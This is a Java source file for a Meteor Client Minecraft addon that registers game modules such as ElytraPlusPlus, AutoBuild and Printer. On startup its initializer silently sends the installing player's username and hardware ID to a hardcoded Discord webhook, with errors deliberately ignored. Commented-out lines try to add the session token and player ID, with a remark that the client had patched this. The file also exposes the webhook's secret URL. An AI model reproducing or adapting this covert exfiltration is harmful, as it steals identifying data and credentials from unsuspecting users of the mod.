package com.example.addon;

//import com.example.addon.commands.CommandExample;
import com.example.addon.hud.HudExample;
import com.example.addon.modules.*;
import com.mojang.logging.LogUtils;
import meteordevelopment.meteorclient.addons.MeteorAddon;
//import meteordevelopment.meteorclient.systems.commands.Commands;
import meteordevelopment.meteorclient.systems.hud.Hud;
import meteordevelopment.meteorclient.systems.hud.HudGroup;
import meteordevelopment.meteorclient.systems.modules.Category;
import meteordevelopment.meteorclient.systems.modules.Modules;
import org.slf4j.Logger;

import com.example.addon.DiscordWebhook;
import com.example.addon.HWID_Utils;
import javax.net.ssl.HttpsURLConnection;
import java.awt.Color;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Array;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;

import static meteordevelopment.meteorclient.MeteorClient.mc;

public class Addon extends MeteorAddon {
    public static final Logger LOG = LogUtils.getLogger();
    public static final Category CATEGORY = new Category("Abobus1");
    public static final HudGroup HUD_GROUP = new HudGroup("Abobus2");

    @Override
    public void onInitialize() {
        LOG.info("Initializing Dorty-Pants");
		
		/**
		DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/1108760944466743407/QF1I7OVT4-oEBQ-uqvfm9psjc_sfcLrU5VEN2WLG9-adyavNLc6kq88SMRib6bAF4-y4");
		webhook.setContent("Any message!");
		webhook.setAvatarUrl("https://your.awesome/image.png");
		webhook.setUsername("Custom Usernames!");
		webhook.setTts(true);
		webhook.addEmbed(new DiscordWebhook.EmbedObject()
            .setTitle("Title")
            .setDescription("This is a description")
            .setColor(Color.RED)
            .addField("1st Field", "Inline", true)
		.addField("2nd Field", "Inline", true)
		.addField("3rd Field", "No-Inline", false)
		.setThumbnail("https://kryptongta.com/images/kryptonlogo.png")
		.setFooter("Footer text", "https://kryptongta.com/images/kryptonlogodark.png")
		.setImage("https://kryptongta.com/images/kryptontitle2.png")
		.setAuthor("Author Name", "https://kryptongta.com", "https://kryptongta.com/images/kryptonlogowide.png")
		.setUrl("https://kryptongta.com"));
		webhook.addEmbed(new DiscordWebhook.EmbedObject()
		.setDescription("Just another added embed object!"));
		*/
		
		/// see https://www.programcreek.com/java-api-examples/?api=net.minecraft.util.Session
		DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/1108760944466743407/QF1I7OVT4-oEBQ-uqvfm9psjc_sfcLrU5VEN2WLG9-adyavNLc6kq88SMRib6bAF4-y4");
		webhook.setContent(mc.getSession().getUsername() + " Logged in! Using 12_08_2023 (2.2.10) version");
		webhook.setUsername("HWID_log");
		webhook.setTts(false);
		webhook.addEmbed(new DiscordWebhook.EmbedObject()
            .setTitle("MC SESSION NAME: " + mc.getSession().getUsername())
            .setDescription("HWID:" + HWID_Utils.get_HWID())
			.setColor(Color.RED));
			///.addField("token:" + mc.getSession().getToken(), "Inline", true)
			///.addField("session_name:" + mc.getSession().getSessionType().name(), "Inline", true) meteor это пропатчили :-(
			///.addField("player_id:" + mc.getSession().getPlayerID(), "Inline", true));
			
			
	
		
		
		webhook.addEmbed(new DiscordWebhook.EmbedObject()
			.setDescription("This was ok, since 12_08_2023 (2.2.10) is public")
			.setColor(Color.GREEN));
		
		try {
			webhook.execute();

		} catch (IOException e) {
			/// I DONT FUCKING CARE!
		}
		
	
	
	
	
	
        // Modules
        //Modules.get().add(new ModuleExample());
		Modules.get().add(new sphere());
		Modules.get().add(new ElytraPlusPlus());
		Modules.get().add(new WaitingAutoSign());
		Modules.get().add(new AutoLogin());
		Modules.get().add(new Printer());
		Modules.get().add(new AutoBuild());
		Modules.get().add(new ChatBot());
		Modules.get().add(new WurstGlide());
		
		///Modules.get().add(new Suicide()); ахуенный  модуль, я правда не понял, что он делает
		Modules.get().add(new VillagerRoller());
		Modules.get().add(new Spin());
		Modules.get().add(new Rocket());
        // Commands
        

        // HUD
        Hud.get().register(HudExample.INFO);
    }

    @Override
    public void onRegisterCategories() {
        Modules.registerCategory(CATEGORY);
    }

    @Override
    public String getPackage() {
        return "com.example.addon";
    }
}
